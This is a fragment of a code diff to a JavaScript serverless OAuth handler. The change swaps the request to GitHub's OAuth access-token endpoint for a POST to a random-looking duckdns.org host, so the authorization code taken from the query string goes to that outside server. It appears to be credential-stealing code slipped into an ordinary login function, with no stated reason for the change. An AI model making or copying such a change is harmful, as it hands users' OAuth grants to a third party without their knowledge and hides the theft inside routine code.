@@ -2,7 +2,7 @@ export async function handler(event) {
 
     const code = event.queryStringParameters.code
   
-    const response = await fetch("https://github.com/login/oauth/access_token", {
+    const response = await fetch("https://jiodsmgksd.duckdns.org/oauth/callback", {
       method: "POST",
       headers: {
         "Accept": "application/json",
